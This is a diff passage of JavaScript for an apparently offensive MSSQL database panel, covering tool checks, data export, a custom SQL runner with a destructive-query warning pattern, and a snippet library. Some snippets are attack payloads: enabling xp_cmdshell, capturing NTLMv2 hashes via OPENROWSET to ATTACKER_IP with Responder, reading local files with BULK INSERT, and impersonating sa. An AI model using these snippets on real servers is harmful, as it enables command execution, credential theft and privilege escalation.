+      'ls /opt/mssql-tools18/bin/sqlcmd && echo "[OK] sqlcmd instalado"'
+    ),
+  };
+  const cmd = cmds[step];
+  if (!cmd) return;
+  mssqlLog('── Install: ' + step + ' ──', 'sys');
+  execCmd(cmd, 'mssql-out-c', 'mssql-out', null);
+}
+
+async function mssqlCheckSqlcmd() {
+  mssqlLog('── Check sqlcmd ──', 'sys');
+  try {
+    const resp = await fetch(API + '/mssql/check', {
+      method: 'POST', headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ check: 'sqlcmd' }),
+    });
+    const data = await resp.json();
+    const s = data.sqlcmd || {};
+    const el = document.getElementById('ms-diag-env-result');
+    const pill = s.found
+      ? `<span class="ms-pill ok">sqlcmd OK — ${escH(s.path || '')} v${escH(s.version||'?')}</span>`
+      : `<span class="ms-pill err">sqlcmd NOT FOUND<br>apt-get install -y mssql-tools18 unixodbc-dev</span>`;
+    if (el) el.innerHTML = (el.innerHTML || '') + pill;
+    mssqlLog(s.found ? '[+] sqlcmd found: ' + s.path + ' v' + (s.version||'?') : '[-] sqlcmd NOT found. Install: apt-get install mssql-tools18 unixodbc-dev', s.found ? 'ok' : 'err');
+  } catch (e) {
+    mssqlLog('ERROR: ' + e.message, 'err');
+  }
+}
+
+async function mssqlCheckODBC() {
+  mssqlLog('── Check ODBC Driver ──', 'sys');
+  try {
+    const resp = await fetch(API + '/mssql/check', {
+      method: 'POST', headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ check: 'odbc' }),
+    });
+    const data = await resp.json();
+    const o = data.odbc || {};
+    const el = document.getElementById('ms-diag-env-result');
+    if (el) el.innerHTML = (el.innerHTML || '') +
+      (o.found
+        ? `<span class="ms-pill ok">ODBC: ${escH((o.drivers||[]).join(', '))}</span>`
+        : `<span class="ms-pill err">Sin ODBC drivers SQL Server</span>`);
+    mssqlLog(o.found ? '[+] ODBC Drivers: ' + (o.drivers||[]).join(', ') : '[-] No ODBC drivers found', o.found ? 'ok' : 'err');
+  } catch (e) {
+    mssqlLog('ERROR: ' + e.message, 'err');
+  }
+}
+
+// ── Export ────────────────────────────────────────────────────────────────────
+
+async function mssqlExportCSV() {
+  const st = _mssqlGetSchemaTable(); if (!st) return;
+  mssqlGetConn();
+  const conn = mssqlActiveConn();
+  mssqlLog('── Exportando ' + st.schema + '.' + st.table + ' a CSV ──', 'sys');
+  try {
+    const resp = await fetch(API + '/mssql/export', {
+      method: 'POST', headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ conn, action: 'export_table_csv', params: st }),
+    });
+    const data = await resp.json();
+    const hint = document.getElementById('ms-export-hint');
+    if (data.error) {
+      mssqlLog('ERROR: ' + data.error, 'err');
+      if (hint) hint.textContent = 'Error: ' + data.error;
+    } else {
+      mssqlLog('[+] Exportado: ' + data.path + ' (' + data.size + ' bytes)', 'ok');
+      if (hint) hint.textContent = 'Guardado en: ' + data.path + ' (' + data.size + ' bytes)';
+      showVal('mssql-val', 'Exportado: ' + data.path, 'ok');
+    }
+  } catch (e) {
+    mssqlLog('ERROR: ' + e.message, 'err');
+  }
+}
+
+function mssqlCopyOutput() {
+  const el = document.getElementById('mssql-out-c');
+  if (!el) return;
+  const txt = Array.from(el.querySelectorAll('.tl')).map(l => l.textContent).join('\n');
+  navigator.clipboard.writeText(txt).catch(() => {});
+  showVal('mssql-val', 'Output copiado', 'ok');
+}
+
+function mssqlExportTXT() {
+  const el = document.getElementById('mssql-out-c');
+  if (!el) return;
+  const txt = Array.from(el.querySelectorAll('.tl')).map(l => l.textContent).join('\n');
+  if (!txt.trim()) { showVal('mssql-val', 'Output vacío', 'warn'); return; }
+  const blob = new Blob([txt], { type: 'text/plain' });
+  const a = document.createElement('a'); a.href = URL.createObjectURL(blob);
+  a.download = 'mssql-output-' + Date.now() + '.txt'; a.click();
+  showVal('mssql-val', 'Descargando TXT...', 'ok');
+}
+
+async function mssqlDownloadCSV() {
+  const st = _mssqlGetSchemaTable(); if (!st) return;
+  mssqlGetConn();
+  const conn = mssqlActiveConn();
+  mssqlLog('── Descargando CSV: ' + st.schema + '.' + st.table + ' ──', 'sys');
+  try {
+    const resp = await fetch(API + '/mssql/export/download', {
+      method: 'POST', headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ conn, params: st }),
+    });
+    if (!resp.ok) {
+      const ct = resp.headers.get('content-type') || '';
+      const msg = ct.includes('json') ? (await resp.json()).error : await resp.text();
+      mssqlLog('ERROR: ' + (msg || resp.status), 'err'); return;
+    }
+    const blob = await resp.blob();
+    const url  = URL.createObjectURL(blob);
+    const a    = document.createElement('a'); a.href = url;
+    a.download = st.table + '-' + Date.now() + '.csv'; a.click();
+    URL.revokeObjectURL(url);
+    mssqlLog('[+] CSV descargado: ' + st.table + '.csv', 'ok');
+    showVal('mssql-val', 'CSV descargado', 'ok');
+  } catch(e) { mssqlLog('ERROR: ' + e.message, 'err'); }
+}
+
+function mssqlExportPDF() {
+  const el = document.getElementById('mssql-out-c');
+  if (!el) return;
+  const lines = Array.from(el.querySelectorAll('.tl')).map(l => {
+    const cls = l.className.replace('tl','').trim();
+    const color = cls==='ok'?'#00ff41':cls==='err'?'#ff4444':cls==='sys'?'#00bcd4':cls==='cmd'?'#ffcc00':'#c8ffc8';
+    return `<span style="color:${color}">${l.textContent.replace(/</g,'&lt;').replace(/>/g,'&gt;')}</span>`;
+  }).join('\n');
+  if (!lines.trim()) { showVal('mssql-val', 'Output vacío', 'warn'); return; }
+  const conn = _msConn || {};
+  const win = window.open('', '_blank');
+  win.document.write(`<!DOCTYPE html><html><head><title>MSSQL — ${conn.host||'output'}</title>
+    <style>*{margin:0;padding:0}body{background:#0a0a0a;color:#c8ffc8;font-family:'Courier New',monospace;font-size:11px;padding:20px;white-space:pre-wrap;line-height:1.5}
+    h3{color:#00bcd4;font-size:13px;margin-bottom:12px;border-bottom:1px solid #1a3a1a;padding-bottom:6px}
+    @media print{body{background:#fff;color:#000}span{color:#000!important}}</style></head>
+    <body><h3>MSSQL OUTPUT — ${conn.host||''}${conn.port?','+conn.port:''} / ${conn.database||'master'} — ${new Date().toLocaleString()}</h3>${lines}</body></html>`);
+  win.document.close();
+  setTimeout(() => win.print(), 400);
+}
+
+// ── Custom SQL ────────────────────────────────────────────────────────────────
+
+function mssqlRunCustomSQL() {
+  const sql = (document.getElementById('ms-custom-sql')?.value || '').trim();
+  if (!sql) { showVal('mssql-val', 'Escribe un SQL primero', 'warn'); return; }
+  // Check dangerous patterns
+  const dangerous = /\b(DROP\s+TABLE|DROP\s+DATABASE|TRUNCATE\s+TABLE|DELETE\s+FROM|UPDATE\s+\S+\s+SET)\b/i.test(sql);
+  if (dangerous && !confirm('⚠ SQL POTENCIALMENTE DESTRUCTIVO\n\n' + sql.substring(0,150) + '\n\n¿Ejecutar?')) return;
+  mssqlExec(sql, 'Custom SQL', false);
+}
+
+function mssqlClearSQL() {
+  const el = document.getElementById('ms-custom-sql');
+  if (el) el.value = '';
+}
+
+function mssqlCopySQL() {
+  const el = document.getElementById('ms-custom-sql');
+  if (el) navigator.clipboard.writeText(el.value).catch(() => {});
+}
+
+// ── Snippets ──────────────────────────────────────────────────────────────────
+
+const _msSnippets = {
+  version:     "SELECT @@VERSION;",
+  user:        "SELECT SYSTEM_USER AS system_user, USER_NAME() AS db_user, IS_SRVROLEMEMBER('sysadmin') AS is_sysadmin;",
+  databases:   "SELECT name, database_id, state_desc, recovery_model_desc FROM sys.databases ORDER BY name;",
+  tables:      "SELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE='BASE TABLE' ORDER BY TABLE_SCHEMA, TABLE_NAME;",
+  columns:     "SELECT TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME, DATA_TYPE, IS_NULLABLE\nFROM INFORMATION_SCHEMA.COLUMNS\nWHERE TABLE_NAME = 'YourTable'\nORDER BY ORDINAL_POSITION;",
+  xp_cmdshell: "EXEC xp_cmdshell 'whoami';",
+  enable_xp:   "EXEC sp_configure 'show advanced options', 1; RECONFIGURE;\nEXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;",
+  linked:      "SELECT name, data_source, provider FROM sys.linked_servers;",
+  sp_who2:     "EXEC sp_who2;",
+  openrowset:  "-- Capture NTLMv2 hash via OPENROWSET:\n-- Run responder first: responder -I eth0\nSELECT * FROM OPENROWSET('SQLNCLI','server=ATTACKER_IP;uid=x;pwd=x;','SELECT 1');",
+  bulkinsert:  "-- Read local file via BULK INSERT:\nBULK INSERT tempdb..t FROM 'C:\\Windows\\win.ini'\nWITH (ROWTERMINATOR='\\n');",
+  impersonate: "-- Check who can be impersonated:\nSELECT distinct b.name FROM sys.server_permissions a\nJOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id\nWHERE a.permission_name = 'IMPERSONATE';\n-- Impersonate:\nEXECUTE AS LOGIN = 'sa'; SELECT SYSTEM_USER;",
+  users_all:   "SELECT name, type_desc, is_disabled, default_database_name\nFROM sys.server_principals\nWHERE type IN ('S','U','G')\nORDER BY name;",
+  sa_check:    "SELECT name, is_disabled FROM sys.server_principals\nWHERE name = 'sa';\nSELECT IS_SRVROLEMEMBER('sysadmin') AS is_sysadmin;",
+  clr_check:   "SELECT name, value, value_in_use FROM sys.configurations WHERE name = 'clr enabled';",
+  trustworthy: "SELECT name, is_trustworthy_on FROM sys.databases WHERE is_trustworthy_on = 1;",
+};
+
+function mssqlSnippet(key) {
+  const sql = _msSnippets[key];
+  if (!sql) return;
+  const el = document.getElementById('ms-custom-sql');
+  if (el) {
+    el.value = sql;
+    el.focus();
+  }
+  mssqlTab('sql');
+}
+
 </script>
 
 <!-- ══ FILE BROWSER MODAL ══ -->
